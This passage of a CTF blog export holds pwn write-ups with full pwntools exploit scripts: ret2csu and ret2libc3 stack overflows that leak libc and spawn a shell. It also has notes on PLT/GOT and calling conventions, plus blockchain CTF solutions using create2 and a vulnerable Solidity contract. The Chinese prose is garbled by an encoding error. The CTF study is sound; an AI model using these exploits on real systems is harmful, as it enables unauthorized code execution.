    <content type="text"><![CDATA[ctf-wiki ‰∏≠ ret2csu ÔºåÂØπ‰∫é 64 ‰ΩçÁ®ãÂ∫èÔºåËØ¶ÁªÜÂèÇËÄÉ ctf-wiki ÊàëÁöÑÊµãËØïÁéØÂ¢É‰∏∫ ubuntu18.04 ÔºåÂõ†‰∏∫Ëøô‰∏™ÁéØÂ¢ÉÂç°‰∫ÜÂ•Ω‰πÖÔºåÂ§ö‰∫Ü‰∏ÄÊù°Êåá‰ª§ÔºåÊúÄÂêéÊÄªÊòØË∑≥‰∏çËøáÂéª 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *local=1pc=&apos;./level5&apos;aslr=Truecontext.log_level=True#context.terminal = [&quot;deepin-terminal&quot;,&quot;-x&quot;,&quot;sh&quot;,&quot;-c&quot;]libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)level5 = ELF(&apos;./level5&apos;)if local==1: #p = process(pc,aslr=aslr,env=&#123;&apos;LD_PRELOAD&apos;: &apos;./libc.so.6&apos;&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,&apos;c&apos;)else: remote_addr=[&apos;111.198.29.45&apos;, 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =&quot;&quot;): gdb.attach(p , b) raw_input()def lg(s, addr): log.info(&apos;\033[1;31;40m %s --&gt; 0x%x \033[0m&apos; % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,&apos;\x00&apos;)) else: return u64(rl().strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))csu_front_addr = 0x400600csu_end_addr = 0x40061adef csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 payload += p64(csu_end_addr) payload += p64(rbx) payload += p64(rbp) payload += p64(r12) payload += p64(r13) payload += p64(r14) payload += p64(r15) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(last) sl(payload) sleep(1)if __name__ == &apos;__main__&apos;: write_plt = level5.plt[&apos;write&apos;] write_got = level5.got[&apos;write&apos;] start_addr = level5.symbols[&apos;_start&apos;] bss_addr = level5.bss() read_got = level5.got[&apos;read&apos;] lg(&apos;write_plt&apos;, write_plt) lg(&apos;write_got&apos;, write_got) lg(&apos;start_addr&apos;, start_addr) lg(&apos;bss_addr&apos;, bss_addr) ru(&apos;Hello, World\n&apos;) # write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, start_addr) write_addr = u64(rv(8)) lg(&apos;write_addr&apos;, write_addr) # 0x250 libc_base_addr = write_addr - libc.symbols[&apos;write&apos;] lg(&apos;libc_base_addr&apos;, libc_base_addr) system_addr = libc_base_addr + libc.symbols[&apos;system&apos;] lg(&apos;system_addr&apos;, system_addr) binsh_addr = libc_base_addr + libc.search(&quot;/bin/sh&quot;).next() lg(&apos;binsh_addr&apos;, binsh_addr) ru(&apos;Hello, World\n&apos;) # read(0,bss_base,16) # read system and /bin/sh\x00 csu(0, 1, read_got, 16, bss_addr, 0, start_addr) sn(p64(system_addr)+&apos;/bin/sh\x00&apos;) # gdb.attach(p) # pause() ru(&apos;Hello, World\n&apos;) # csu(0, 1, bss_addr, 0, 0, bss_addr+8, start_addr) # system(bss_base+8) payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 # Â∞±ÊòØËøô‰∏™Âú∞ÊñπÂ§ö‰∫Ü‰∏ÄÊù°movapsÂëΩ‰ª§ÔºåÊâÄ‰ª•Ë∑≥‰∏çËøáÂéªÔºåÊâÄ‰ª•ÈúÄË¶Åpop rip‰∏Ä‰∏ãÔºåÂ¶ÇÊûúÊòØubuntu16.04Â∫îËØ•ÊòØÊ≠£Â∏∏ÁöÑ payload += p64(0x400624) payload += p64(csu_end_addr) payload += p64(0) payload += p64(1) payload += p64(bss_addr) payload += p64(0) payload += p64(0) payload += p64(bss_addr+8) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(start_addr) sl(payload) pi()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2csu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[32&64]]></title>
    <url>%2F2020%2F32-64%2F</url>
    <content type="text"><![CDATA[32 ‰ΩçÂíå 64 ‰ΩçÁ®ãÂ∫èÁöÑ‰∏Ä‰∫õÁÆÄÂçïÂå∫Âà´ ÈöèÊó∂Êõ¥Êñ∞ÔºåÊÉ≥Âà∞Âì™ÂÜôÂà∞Âì™ ÂèÇÊï∞È°∫Â∫è 32‰Ωç ÂáΩÊï∞ÂèÇÊï∞Âú®ÂáΩÊï∞ËøîÂõûÂú∞ÂùÄÁöÑ‰∏äÊñπ ÂèÇÊï∞‰ªéÂè≥ÂêëÂ∑¶‰æùÊ¨°ÊîæÂÖ•Ê†à‰∏≠ 64‰Ωç ÂΩìÂèÇÊï∞Â∞è‰∫é 7 ‰∏™Êó∂ÔºåÂèÇÊï∞‰ªéÂ∑¶Âà∞Âè≥ÊîæÂÖ•ÂØÑÂ≠òÂô®Ôºö rdi„ÄÅrsi„ÄÅrdx„ÄÅrcx„ÄÅr8„ÄÅr9 ÂΩìÂèÇÊï∞‰∏∫ 7 ‰∏™‰ª•‰∏äÊó∂ÔºåÂâç 6 ‰∏™‰∏éÂâçÈù¢‰∏ÄÊ†∑Ôºå‰ΩÜÂêéÈù¢ÁöÑ‰æùÊ¨°‰ªéÂè≥ÂêëÂ∑¶ÊîæÂÖ•Ê†à‰∏≠ÔºåÂç≥Âíå32‰ΩçÊ±áÁºñ‰∏ÄÊ†∑]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2libc3]]></title>
    <url>%2F2020%2Fret2libc3%2F</url>
    <content type="text"><![CDATA[ctf-wiki ‰∏≠ ret2libc3 Ê≤°Êúâ system Âíå /bin/sh ÔºåÊ≥ÑÊºè libc Analyse Ê≥ÑÊºè _start Âú∞ÂùÄ Ëé∑Âèñ libc ÁâàÊú¨ Ëé∑Âèñ system ‰∏é /bin/sh Âú∞ÂùÄ ÂÜçÊ¨°ÊâßË°åÊ∫êÁ®ãÂ∫è Ëß¶ÂèëÊ†àÊ∫¢Âá∫ÊâßË°å system(&#39;/bin/sh&#39;) Exp 1 Ëá™Â∑±ÂÜôÁöÑ exp ÔºåÊ†πÊçÆÊ≥ÑÊºèÁöÑÂú∞ÂùÄÂÖàÊâæÂà∞ libc Âà∞ËøîÂõûÂú∞ÂùÄÁöÑÂÅèÁßªÂèØ‰ΩøÁî® cyclic Âø´ÈÄüÂà§Êñ≠12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *local=1pc='./ret2libc3'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(io , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr',start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) payload += '\x00' sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) distance = libc.symbols['system'] - libc.symbols['__libc_start_main'] lg('distance', distance) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] system_addr = libc_base_addr + libc.symbols['system'] binsh_addr = libc_base_addr + libc.search("/bin/sh").next() lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a' * 112 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() Exp 2 ÂÖàÊ≥ÑÊºè libc ÔºåÁÑ∂Âêé‰ΩøÁî® one_gadget123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *local=1pc='./ret2libc3'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(io , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr',start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] one_gadget = libc_base_addr + 0x3d130 payload = 'a' * 112 payload += p32(one_gadget) sl(payload) pi()"""0x3d130 execve("/bin/sh", esp+0x40, environ)constraints: esi is the GOT address of libc [esp+0x40] == NULL""" Exp 3 ÁΩë‰∏äÊâæÁöÑÂè¶‰∏Ä‰∏™ÁâàÊú¨‰ΩøÁî® LibcSearcher Ê≥ÑÊºè libc12345678910111213141516171819202122232425262728##coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('./ret2libc3')puts_plt = ret2libc3.plt['puts']libc_start_main_got = ret2libc3.got['__libc_start_main']main = ret2libc3.symbols['_start']print("leak main_got addr and return main")payload = flat(['A'*112,puts_plt,main,libc_start_main_got])sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4])print(hex(libc_start_main_addr))libc = LibcSearcher('__libc_start_main',libc_start_main_addr)libcbase = libc_start_main_addr-libc.dump('__libc_start_main')system_addr = libcbase+libc.dump('system')binsh_addr = libcbase +libc.dump('str_bin_sh')print("now get shell")payload = flat(['A'*112,system_addr,'A'*4,binsh_addr])sh.send(payload)sh.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2libc3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[plt&got]]></title>
    <url>%2F2020%2Fplt-got%2F</url>
    <content type="text"><![CDATA[Â≠¶‰π†‰∏Ä‰∫õ pwn ÁöÑÁü•ËØÜÔºåÁÆÄÂçïËÆ∞ÂΩïÂ∏ÆÂä©Ëá™Â∑±ÁêÜËß£ Preview .got GOT(Global Offset Table) ÂÖ®Â±ÄÂÅèÁßªË°®„ÄÇËøôÊòØÈìæÊé•Âô®‰∏∫Â§ñÈÉ®Á¨¶Âè∑Â°´ÂÖÖÁöÑÂÆûÈôÖÂÅèÁßªË°®„ÄÇ .plt PLT(Procedure Linkage Table) Á®ãÂ∫èÈìæÊé•Ë°®„ÄÇÂÆÉÊúâ‰∏§‰∏™ÂäüËÉΩÔºåË¶Å‰πàÂú® .got.plt ËäÇ‰∏≠ÊãøÂà∞Âú∞ÂùÄÂπ∂Ë∑≥ËΩ¨ÔºåË¶Å‰πàÂΩì .got.plt Ê≤°ÊúâÊâÄÈúÄÂú∞ÂùÄÊó∂ÔºåËß¶ÂèëÈìæÊé•Âô®ÂéªÊâæÂà∞ÊâÄÈúÄÂú∞ÂùÄ„ÄÇ .got.plt Ëøô‰∏™ÊòØ GOT ‰∏ìÈó®‰∏∫ PLT ‰∏ìÈó®ÂáÜÂ§áÁöÑËäÇ„ÄÇ.got.plt ‰∏≠ÁöÑÂÄºÊòØ GOT ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂÆÉÂåÖÂê´‰∏äËø∞ PLT Ë°®ÊâÄÈúÄÁöÑÂú∞ÂùÄÔºàÂ∑≤ÁªèÊâæÂà∞ÁöÑÂíåÈúÄË¶ÅÂéªËß¶ÂèëÁöÑÔºâ .plt.got Unknown Analyse ‰∏ãÈù¢ÊâÄÊúâÁöÑÂõæÁâáÊù•Ëá™‰∫é https://blog.csdn.net/weixin_44681716/article/details/89877497 Á®ãÂ∫èÁºñËØëÊó∂‰ºöÈááÁî®‰∏§ÁßçË°®ËøõË°åËæÖÂä©Ôºå‰∏Ä‰∏™‰∏∫ PLT Ë°®Ôºå‰∏Ä‰∏™‰∏∫ GOT Ë°®ÔºåËøô‰∏§‰∏™Ë°®ÊòØÁõ∏ÂØπÂ∫îÁöÑ„ÄÇPLT Ë°®‰∏≠ÁöÑÊØè‰∏ÄÈ°πÁöÑÊï∞ÊçÆÂÜÖÂÆπÈÉΩÊòØÂØπÂ∫îÁöÑ GOT Ë°®‰∏≠‰∏ÄÈ°πÁöÑÂú∞ÂùÄÔºåËøô‰∏™ÊòØÂõ∫ÂÆö‰∏çÂèòÁöÑÔºåPLT Ë°®‰∏≠ÁöÑÊï∞ÊçÆ‰∏çÊòØÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄÔºåËÄåÊòØ GOT Ë°®È°πÁöÑÂú∞ÂùÄ„ÄÇ ‰∏ãÂõæÊòØÁ¨¨‰∏ÄÊ¨°Ë∞ÉÁî®ÂáΩÊï∞ÁöÑÊµÅÁ®ã Á¨¨‰∏ÄÊ≠•ÔºåÁî±ÂáΩÊï∞Ë∞ÉÁî®Ë∑≥ÂÖ•Âà∞ PLT Ë°®‰∏≠ Á¨¨‰∫åÊ≠•ÔºåPLT Ë°®Ë∑≥Âà∞ GOT Ë°®‰∏≠ Á¨¨‰∏âÊ≠•ÔºåGOT Ë°®ÂõûË∑≥Âà∞ PLT Ë°®‰∏≠ÔºåËøôÊó∂ÂÄôËøõË°åÂéãÊ†àÔºåÊää‰ª£Ë°®ÂáΩÊï∞ÁöÑ ID ÂéãÊ†à Á¨¨ÂõõÊ≠•ÔºåË∑≥ËΩ¨Âà∞ÂÖ¨ÂÖ±ÁöÑ PLT Ë°®È°π‰∏≠ Á¨¨‰∫îÊ≠•ÔºåËøõÂÖ•Âà∞ GOT Ë°® Á¨¨ÂÖ≠Ê≠•Ôºå_dl_runtime_resolve ÂØπÂä®ÊÄÅÂáΩÊï∞ËøõË°åÂú∞ÂùÄËß£ÊûêÂíåÈáçÂÆö‰Ωç Á¨¨‰∏ÉÊ≠•ÔºåÊääÂä®ÊÄÅÂáΩÊï∞ÁúüÂÆûÁöÑÂú∞ÂùÄÂÜôÂÖ•Âà∞ GOT Ë°®È°π‰∏≠ Á¨¨ÂÖ´Ê≠•ÔºåÊâßË°åÂáΩÊï∞Âπ∂ËøîÂõû ‰∏ãÂõæÊòØÁ¨¨‰∫åÊ¨°Ë∞ÉÁî®ÂáΩÊï∞ÁöÑÊµÅÁ®ã Á¨¨‰∏ÄÊ≠•ÔºåÁî±ÂáΩÊï∞Ë∞ÉÁî®Ë∞ÉÂÖ•Âà∞ PLT Ë°®‰∏≠ Á¨¨‰∫åÊ≠•ÔºåË∑≥ÂÖ•Âà∞ GOT Ë°®ÔºåÁî±‰∫éËøôÊó∂ÂÄôËØ•Ë°®È°πÂ∑≤ÁªèÊòØÂä®ÊÄÅÂáΩÊï∞ÁöÑÁúüÂÆûÂú∞ÂùÄÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÊâßË°åÁÑ∂ÂêéËøîÂõû Referencehttps://blog.csdn.net/weixin_44681716/article/details/89877497https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>plt</tag>
        <tag>got</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Á¨¨‰∫îÁ©∫Èó¥ CreativityPlus]]></title>
    <url>%2F2020%2Fcreativityplus%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Á¨¨‰∫îÁ©∫Èó¥ creativityplus È¢òÁõÆ È¢òÁõÆÊúâ‰∏™ÈùûÈ¢ÑÊúüÔºåÁõ¥Êé•ÈÉ®ÁΩ≤‰∏Ä‰∏™Â≠óËäÇ stop Êåá‰ª§‰πüÂèØ‰ª•Ôºå0x600a600c60003960016000f3+00 ÊñáÁ´†‰ªãÁªçÈ¢ÑÊúüËß£ Analyse &amp; Solution È¢òÁõÆÂæàÁÆÄÂçïÔºåÊîπÁºñËá™ Creativity È¢òÁõÆÔºåÁÆÄÁß∞ CreativityPlus ÂçáÁ∫ßÁâà ËÄÉÁÇπ create2 ‰∏é bytecode È¢òÁõÆÈÄªËæëÂ¶Ç‰∏ãÔºö ÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶ÔºåÂ§ßÂ∞è‰∏çË∂ÖËøá 4 Â≠óËäÇ Ë∞ÉÁî® check ÔºåÂèÇÊï∞ÊòØÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ Ë∞ÉÁî® executeÔºå‰ΩøÂæóËøîÂõûÂÄº‰∏∫ trueÔºåÊàë‰ª¨Âç≥ÂèØÊàê‰∏∫ owner ‰ΩÜÊòØÊàë‰ª¨Ê≤°Ê≥ïÂú® 4 ‰∏™Â≠óËäÇÂÜÖ emit SendFlag create2 È™öÊìç‰ΩúÔºå‰ΩøÁî®Â¶Ç‰∏ã‰ª£Á†ÅÂèØÂ∞Ü‰∏çÂêå bytecode ÈÉ®ÁΩ≤Âà∞Âêå‰∏Ä‰∏™Âú∞ÂùÄ‰∏äÔºådeployedAddr Âç≥‰∏∫ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex&apos;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&apos;; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; ÊâÄ‰ª•È¢òÁõÆÁöÑÈÄªËæëÂ¶Ç‰∏ã: Áî® create2 ÁöÑÈ™öÊìç‰Ωú,ÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶ 0x33ff ,Âç≥ selfdestruct(msg.sender) Ë∞ÉÁî® check() ,ËÆ© target ‰∏∫Êàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âú∞ÂùÄ ÁªôÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶Âèë‰∏ÄÁ¨îÁ©∫‰∫§Êòì,ËÆ©ÂÆÉËá™ÊØÅ ÂÜçÊ¨°‰ΩøÁî® create2 È™öÊìç‰Ωú,Âú®Âêå‰∏Ä‰∏™Âú∞ÂùÄÈÉ®ÁΩ≤ÂêàÁ∫¶,ÂêàÁ∫¶ÂÜÖÂÆπÂ§ßÂ∞è‰∏çË∂ÖËøá 10 Â≠óËäÇÔºåËøîÂõû 1 ËøîÂõûÂÄºÁî± return(p, s) Êìç‰ΩúÁ†ÅÂ§ÑÁêÜÔºå‰ΩÜÊòØÂú®ËøîÂõûÂÄº‰πãÂâçÔºåÂøÖÈ°ªÂÖàÂ≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠Ôºå‰ΩøÁî® mstore(p, v) Â∞Ü 1 Â≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠ È¶ñÂÖàÔºå‰ΩøÁî® mstore(p, v) Â∞Ü 1 Â≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠ÔºåÂÖ∂‰∏≠ p ÊòØÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂ≠òÂÇ®‰ΩçÁΩÆÔºå v ÊòØÂçÅÂÖ≠ËøõÂà∂ÂÄºÔºå1 ÁöÑÂçÅÂÖ≠ËøõÂà∂ÊòØ 0x01 1230x6001 ;PUSH1 0x01 v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE ÁÑ∂ÂêéÔºå‰ΩøÁî® return(p, s) ËøîÂõû 0x01 ÔºåÂÖ∂‰∏≠ p ÊòØÂÄº 0x2a Â≠òÂÇ®ÁöÑ‰ΩçÁΩÆÔºås ÊòØÂÄº 0x2a Â≠òÂÇ®ÊâÄÂç†ÁöÑÂ§ßÂ∞è 0x20 ÔºåÂç† 32 Â≠óËäÇ 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN ÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄ‰ΩøÁî® Deployer.deploy ÈÉ®ÁΩ≤ 0x600160805260206080f3 Âç≥ÂèØÔºåÊ≠£Â•Ω 10 opcodes Ë∞ÉÁî® execute Êàë‰ª¨Âç≥ÂèØÊàê‰∏∫ owner]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ª•Â§™ÂùäËúúÁΩêÂêàÁ∫¶Êî∂ÈõÜÂàóË°®]]></title>
    <url>%2F2020%2Fhoneypot-list%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ÂÖ¨Èìæ‰∏äÁöÑËúúÁΩêÂêàÁ∫¶ ‰∏çÊñ≠Êõ¥Êñ∞ÂàóË°®]]></content>
      <categories>
        <category>Ethereum</category>
      </categories>
      <tags>
        <tag>Ethereum</tag>
        <tag>Etherscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Real World CTF Finals 2019 - Montagy]]></title>
    <url>%2F2020%2FMontagy%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä rw2019 montagy Âå∫ÂùóÈìæÈ¢òÁõÆ Â§çÁé∞‰∫ÜÔºå‰ΩÜÊòØÊ≤°ÊúâËÆ∞ÂΩïËøáÁ®ãÔºåËøôÈáåÂè™ËÆ∞ÂΩïÂøÉÂæó Â§çÁé∞ÁöÑÂêàÁ∫¶Âú∞ÂùÄÔºö0xd95C819d1DFBD085dFf0b3351230958Cb6075957@ropsten ËØ¶ÁªÜ WP ËßÅ https://x9453.github.io/2020/01/26/Real-World-CTF-Finals-2019-Montagy/ ÂêàÁ∫¶Á°ÆÂÆöÂêé‰ºöÊúâËá™Â∑±ÁöÑ bytecode ÔºåÂØπ bytecode ËøõË°å padding ‰∏ç‰ºöÂΩ±ÂìçÂÖ∂ÈÉ®ÁΩ≤ÁöÑÁªìÊûú ÂØπ bytecode ËøõË°å padding Ë¶ÅÊ≥®ÊÑèÂØπÈΩêÈóÆÈ¢òÔºåÁî® 0 Ë°•ÈΩê]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rw2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF2020 roiscoin]]></title>
    <url>%2F2020%2Frctf2020-roiscoin%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä RCTF2020 Âå∫ÂùóÈìæ roiscoin È¢òÁõÆ ‰ª•Â§™Âùä Ropsten ÊµãËØïÈìæ Source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; codex[idx] = tmp; &#125;&#125; Analyse È¢òÁõÆÁõ¥Êé•Áªô‰∫ÜÊ∫êÁ†Å È¢òÁõÆÊúâÈùûÈ¢ÑÊúüÔºöbeOwner Âú®ÂêàÁ∫¶Ë¥¶Êà∑‰ΩôÈ¢ù‰∏∫ 0 ÁöÑÊÉÖÂÜµ‰∏ãÂèØ‰ª•Áõ¥Êé•Êàê‰∏∫ owner ÔºåËøô‰∏™Ê≤°ÊúâÊéßÂà∂Â•ΩÊù°‰ª∂ÔºåÂêåÊó∂ settle ÈÇ£ÈáåÂ∫îËØ•‰πüÊúâÈùûÈ¢ÑÊúüÔºåÂ∫îËØ•Âè™ËÆ©Áåú 3 Ê¨°ÔºåÁªìÊûú‰πüÊ≤°ÊúâÊéßÂà∂Â•ΩÊù°‰ª∂ÔºåÊú¨Êñá‰∏ç‰ªãÁªçÈùûÈ¢ÑÊúüÁöÑÂÅöÊ≥ï ÊäõÈô§ÈùûÈ¢ÑÊúüÔºåËøôÈáå‰ªãÁªç‰∏ãÈ¢òÁõÆÊ≠£Â∏∏ÁöÑÈÄªËæëÔºåËÄÉÁÇπÊúâ‰∏â‰∏™: È¢ÑÊµãÈöèÊú∫Êï∞: ËøôÈáåÁöÑÈöèÊú∫Êï∞ÊòØÊú™Êù•ÁöÑÈöèÊú∫Êï∞,ÂèØ‰ª•ËØ¥ÊòØÈ¢ÑÊµãÊú™Êù•ÁöÑÈöèÊú∫Êï∞,Áúã‰ºº‰∏çÂèØËÉΩ,ÂÖ≥ÈîÆÂú®‰∫é guess ÁöÑËåÉÂõ¥ÊòØ 2 ,‰πüÂ∞±ÊòØÂè™Êúâ 0 Âíå 1 ,ÊâÄ‰ª•ÂèØ‰ª•ÁàÜÁ†¥ Êú™ÂàùÂßãÂåñÁöÑÁªìÊûÑ‰Ωì storage 